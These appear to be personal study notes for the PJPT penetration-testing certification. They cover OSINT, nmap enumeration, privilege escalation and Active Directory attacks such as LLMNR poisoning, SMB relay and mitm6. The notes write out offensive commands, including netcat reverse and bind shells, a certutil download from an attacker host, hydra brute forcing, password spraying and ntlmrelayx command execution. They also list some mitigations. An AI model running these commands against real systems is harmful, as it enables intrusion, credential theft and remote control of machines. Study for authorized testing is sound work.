# Practical Junior Penetration Tester (PJPT) Certification

*Types of pentest assessments:*
- External Network Pentest.
  - Hacking in from the outside using Open Source Intelligence (OSINT).
  - Can be required for compliance.
  - Cheaper than larger scope assessments.
- Internal Network Pentest.
  - Heavy focus on AD attacks.
- Web Application Pentest.
  - Web-based attacks and Open Web Application Security Project (OWASP) guidelines.
  - OWASP top 10 attacks!
- Wireless Network Pentest.
  - Method depends on the type of network.
  - Straightforward. Use wireless network adapter.
  - Use packet injection.
- Physical Pentest & Social Engineering.
  - Method depends on the task and goals.
  - Phishing campaign.
- Mobile Penetration Testing.
- IoT Penetration Testing.
- Red Team Engagements.
- Purple Team Engagements.
- Etc...

*Report Writing:*
- Typically delivered within a week after the engagement.
- Highlight technical and non-technical findings.
- Recommendations for remediation.

*Debrief:*
- Walking through report findings, both technical and non-technical.
- Opportunity for the client to ask questions and express concerns.
- Finalize report after the debrief.

## Networking


### IP Addresses
Mainly communicate over Layer 3 (Router).<br>
IPv4 32 bit<br>
IPv6 128 bit

### MAC Addresses
MAC Address is in Layer 2, related to switching.<br>
First 3 pairs in MAC address are idenifiers.

### TCP & UDP
Layer 4.<br>
Transmission Control Protocol (TCP), very reliable. Connection.
- HTTP(S)
- SSH
- RDP
- `SYN -> SYN ACK -> ACK` *(Three way handshake)*
  
User Datagram Protocol (UDP), less reliable but fast. No connection.
- Media streeaming

### Common ports and protocols
TCP:
- FTP (21)
- SSH (22)
- Telnet (23)
- SMTP (25)
- DNS (53)
- HTTP/HTTPS (80/443)
- POP3 (110)
- SMB (139 & 445)
- IMAP (143)

UDP:
- DNS (53)
- DHCP (67 & 68)
- TFTP (69)
- SNMP (161)

### OSI-Model
Layer 1 - Physical, *cables*<br>
Layer 2 - Data, *switching, MAC addresses*<br>
Layer 3 - Network, *routing, IP addresses*<br>
Layer 4 - Transport, *TCP & UDP*<br>
Layer 5 - Session, *session management*<br>
Layer 6 - Presentation, *JPEG, MOV, etc...*<br>
Layer 7 - Application, *HTTP, SMB, FTP, etc...*

### Subnetting
netmask gives subnet.<br>
255.255.255.0 is common /24 network.<br>
11111111.11111111.11111111.00000000<br>
x = #flipped on bits,  /x network.<br>
**Just consider the binary representation for each octet.**

Network ID - First Address<br>
Broadcast IP - Last Address<br>

## The Five Stages of Ethical Hacking

### Reconnaissance

Passive:
- Looking for information on the internet.

Active:
- Use tools

### Scanning & Enumeration

Nmap, Nessus Nikto, etc.

Enumeration:
- Looking for value in found items.
- E.g. looking for outdated things running on an open port.

### Exploitation

Running an exploit to try to gain access using what was found in the previous phase.

### Maintain Access

Repeat the previous process and make sure you keep the access you have

### Covering Tracks

Remove all uploaded malware and clean up on every action you took.

## Information Gathering (Reconnaissance [Passive])

Good source for sources: https://osintframework.com/

### Passive Reconnaissance

Physical/Social:
- Location info
  - Satellite images
  - Drone recon
  - Building layout (blueprints)
- Job Information:
  - Employees (name, title, phone number, manager, ...)
  - Pictures (badge photos, desk photos, computer photos, ...)

Web/Host:
- Target Validation
- Finding Subdomains
- Fingerprinting
- Data Breaches

### Identifying our target

bugcrowd.com

### Discovering Email Addresses (E-Mail OSINT)

Looking for contact information online.
- hunter.io
  - Find patterns in e-mail address structure.
  - Select departments
- Phonebook.cz
  - Get e-mail from URL
  - Also domains and urls from URL.
- voilanorbert.com
  - Same as hunter.io
- Clearbit (Only in chrome)
  - Finds people
  - Sort by role
  - Sort by seniority

Verifying e-mail addresses.
- tools.verifyemailaddress.io (email hippo)
- email-checker.net/validate

Use "forgot password" to find more data (possibly other e-mails)

Steps:
- Google
- hunter.io/Phonebook.cz/Clearbit
- Verify

Use found data to password spray.

### Gathering breached credentials with Breach-Parse (Password OSINT)

github.com/hmaverickadams -> breach-parse (not required to install, useful tool!)

Alternate capitals when you observe patterns for credential stuffing.

### Hunting breached credentials with DeHashed (Password OSINT)

dehashed.com
- Search by known intel, eg. e-mail addresses, username, password, ...

hashes.org
- Search hashes

### Hunting subdomains

Use tools to find different subdomains (that maybe shouldn't be available).

sublist3r (install on kali!!!)
- Looks through searchengines to find subdomains

crt.sh (website)
- Uses certificate fingerprinting

Other tools for kali:
- owasp amass
- tomnomnom httprobe

### Identifying website technologies

You may be able to exploit vulnerabilities in the tech that is being ran.

builtwith.com
- Lookup websites and looks at what tech is running, eg. frameworks

wappalyzer (firefox extension install on kali!!!)
- Go to website and get an indication

whatweb
- Command in kali terminal
- Give a url and find the tech that the website uses and gives headers

### Information gathering with BurpSuite

Built into kali

BurpSuite is a web-proxy, meaning it intercepts traffic.

Set up firefox to utilize BurpSuite.
- Go to https://burp and click CA Certificate.
- Add certificate to firefox.

You can modify traffic in BurpSuite

In the target you can find all different traffic.
- Clicking on the website gives you more information on what's on the page
- Possibly server names, etc.

### Utilizing social media

Images are useful
- linkedin
- twitter
- instagram

Use earlier gleaned formatting to possibly determine e-mails.

Then password spray using weak passwords against these e-mails.

## Information Gathering (Reconnaissance [Active])

### Scanning with nmap

Use netdiscover to find other ip's on network.
- `netdiscover -r xxx.xxx.xxx.0/24`

nmap:
- `nmap -sS` (Stealth scanning [not actually stealthy])
- `SYN SYNACK RST`
- `nmap -T4 -p- -A`
  - `-T4`: Speed between 1-5, 4 is a choice
  - `-p-`: Scan all ports
    - Removing scans top 1000 ports.
    - `-p 80,443,53`: Scan specific port range
  - `-A`: Everything, all data you can find
- Host discovery
  - `-sn`
  - `-pN`
- Scan techniques
  - `-sS`
  - `-sU` (UDP scan)
- `-sV`: Spen ports for service info
- `-sC`: Script scanning
- `-O`: OS detection

First finding open ports, then getting intel on them is generally a good idea for speed.

### Enumeration HTTP/HTTPS

Attacking SMB and HTTP/HTTPS is usually a good first step.

Visit webpage if port 80 (HTTP) or port 443 (HTTPS) is exposed.

nikto:
- Web vulnerbility scanner
- Can be frequently autoblocked by websites
- `nikto -h xxx.xxx.xxx.xxx`
  - `-h`: host

dirbuster/dirb/gobuster for directory busting

gobuster:
- `gobuster dir -u http://[url] -w /usr/share/dirbuster/wordlists/[wordlist]`

dirbuster:
- Enter url: http://xxx.xxx.xxx.xxx:80/
- Choose list: /usr/share/dirbuster/...
- Enter file extension: php,txt,zip,pdf

burpsuite:
- Repeater to find response in realtime and modify your requests.

View sourcecode

Find share:
- `showmount -e xxx.xxx.xxx.xxx`
- `mkdir /mnt/[dirname]`
- `cd /mnt/[dirname]`
- `sudo mount -t [name] xxx.xxx.xxx.xxx:/srv/[name] /mnt/[dirname]`

### Enumeration SMB

Metasploit
- `msfconsole`
  - smb_version detection
- smbclient
  - `smbclient \\\\\\\\xxx.xxx.xxx.xxx\\\\`

### Enumeration SSH

ssh
- `ssh xxx.xxx.xxx.xxx -oKexAlgorithms=+... oHostKeyAlgorithms=+... -c ...`

Possibly exposes a banner.

### Enueration DNS

Check dns server for domains:
- `dnsrecon -r 127.0.0.0/24 -n xxx.xxx.xxx.xxx -d domain`
- `nslookup 127.0.0.xxx -d xxx.xxx.xxx.xxx`
- `sudo nano /etc/hosts`

### Vulnerability research

Google!
- Rapid7
- Exploit Database

If not
- searchsploit ...

## Exploitation

### Shell access

Shell is access to a machine

Reverse shell
- victim connects to us

Bind shell
- we connect to the target

netcat
- reverse
  - `nc -lvp 4444`
  - `nc xxx.xxx.xxx.xxx -e /bin/sh`
- bind
  - `nc xxx.xxx.xxx.xxx`
  - `nc -lvp 4444 -e /bin/sh`

### Staged vs Non-Staged payloads

A payload is what we run as an exploit

Non-staged send shellcode all at once. Staged sends it in stages.

### Brute force

hydra
- `hydra -l [user] -P /usr/share/wordlists/metasploit/... ssh://xxx.xxx.xxx.xxx -t [threads]`

Can also use metasploit or burpsuite.

### Privilege Escalation

linpeas
- Looks for privilege escalation possibilities.
- Put in `/tmp/` folder
- After moving `linpeas.sh` (native on kali) to target, make executable: `chmod +x linpeas.sh`
- Execute `linpeas.sh`

winpeas
- Looks for privilege escalation possibilities
- Put in writeable folder
  - `certutil.exe -urlcache -f "http://xxx.xxx.xxx.xxx/winPEASx64.exe" winpeas.exe`
- `winpeas.exe`

If you can upload something, try to upload a reverse shell script while listening to see if it runs.

Use `pspy` to find running processes.

On processes that run periodically: try edit the process to include a 1-line reverse shell.

Cracking zips quickly:
- `fcrackzip`
  - `fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt [zipfile]`

Local file inclusion exploit can lead to information disclosure.

GTFOBins
- Privilege escalation website

Simple shell to fully interactive shell
- ttyshell
  - `python -c 'import pty; pty.spawn("/bin/bash")'`

## Attacking active directory

### Initial attack vectors

Usually drop of a device to simulate breaking into the network of a client.

#### LLMNR Poisoning

LLMNR Link Local Multicast Name Resolution

Used to ID hosts when DNS fails to do so, previously NBT-NS.

Key flaw is that capturing traffic gives us a name and hash. (Man in the middle attack)

Steps:
- Edit and run responder
  - `sudo mousepad /etc/responder/Responder.conf` *(Make sure all options are on)*
  - `sudo responder -I eth0 -dP`
- An event occurs...
- Get dem hashes
- Crack dem hashes
  - `hashcat -m [mode] hashes/hashes.txt rockyou.txt`

Mitigation:
- Disable LLMNR & NBT-NS
- If not possible:
  - Require Network Access Control
  - Require strong user passwords

#### SMB relay attacks

Instead of capturing hash with responder, relay it with SMB.
- SMB signing must be disabled or not enforced on the target.
- Relayed user credentials must be admin on machine for any real value.
- Can't relay to yourself, you have to relay to a different machine.

Steps:
- Identify hosts without smb signing
  - `nmap --script=smb2-security-mode.nse -p445 xxx.xxx.xxx.0/24` *(Add -Pn for better probing)*
- Edit and run responder
  - `sudo mousepad /etc/responder/Responder.conf` *(Make sure HTTP & SMB are off)*
  - `sudo responder -I eth0 -dP`
- Setup ntlmrelayx
  - `sudo ntlmrelayx.py -tf targets.txt -smb2support --no-wcf-server --no-raw-server --no-winrm-server --no-rpc-server`
- An event occurs...
- Win
- Other wins
  - `nc 127.0.0.1 11000`
  - `sudo ntlmrelayx.py -tf targets.txt -smb2support -i` *(Get interactive shell)*
  - `sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"` *(Run commands)*

Mitigation:
- Enable SMB signing on all devices
- Disable NTLM authentication on network
- Account tiering
  - Limit domain admins to specific tasks (least privilege)
- Local admin restriction
  - This attack is non-viable without local admin rights

#### Gaining shell access

Metasploit - with password
- `use exploit/windows/smb/psexec`

Metasploit - with hash
- `use exploit/windows/smb/psexec`

psexec.py - with password
- `psexec.py marvel.local/fcastle:'P@$$w0rd!'@xxx.xxx.xxx.xxx`

psexec.py - with hash
- `psexec.py administrator@xxx.xxx.xxx.xxx -hashes LM:NT`

Alternatives to `psexec.py`, use `wmiexec.py` or use `smbexec.py`.

#### IPv6 attacks

Abuse that noone does DNS for IPv6 if devices use IPv4.

We can play the role of DNS for IPv6.

Get SMB or LDAP access to Domain Controller.

We can relay NTLM through LDAP to the DC.

This is called Man in the Middle 6 *(MitM6)*.

Steps:
- Setup `ntlmrelayx.py`
  - `ntlmrelayx.py -6 -t ldaps://192.168.4.128 -wh fakewpad.marvel.local -l lootme`
- Launch MitM6
  - `sudo mitm6 -d [domain]`
- Now collect ye plunder in `lootme`
- Look for outdated devices to easily exploit in `domain_computers.html`
- Look at `domain_users_by_group.html` to identify targets
  - Check out descriptions!

Mitigation:
- Disable IPv6 internally *(Bad idea)*
- Issue blocks:
  - (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-In)
  - (Inbound) Core Networking - Router Advertisement (ICMPv6-In)
  - (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-Out)
- Disable WPAD *(If not internally in use)* by disabling the `WinHttpAutoProxySvc`
- Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding
- Consider adding Administrative users to the Protected Users group or marking them as sensitive and not to be delegated, which will prevent any impersonation of that user via delegation.

#### Passback attacks

Access to something that connects to LDAP or does an SMB connection. *(printers, eg.)*

Changing LDAP to attacker IP address and setting up listener sends the password in cleartext, even if the password is obfuscated in the text.

#### Initial Internal Attack Strategy

Enumeration is the most important thing!!!

Begin the day with `mitm6` or `responder`.

Run scans to generate traffic, nessus, nmap, etc.

If scans take too long, look for websites in scope.

Look for default credentials on web logins
- Printers
- Jenkins
- Etc...

Think outside the box :)

If nothing works and everything looks good, ask the client to possibly create credentials for us.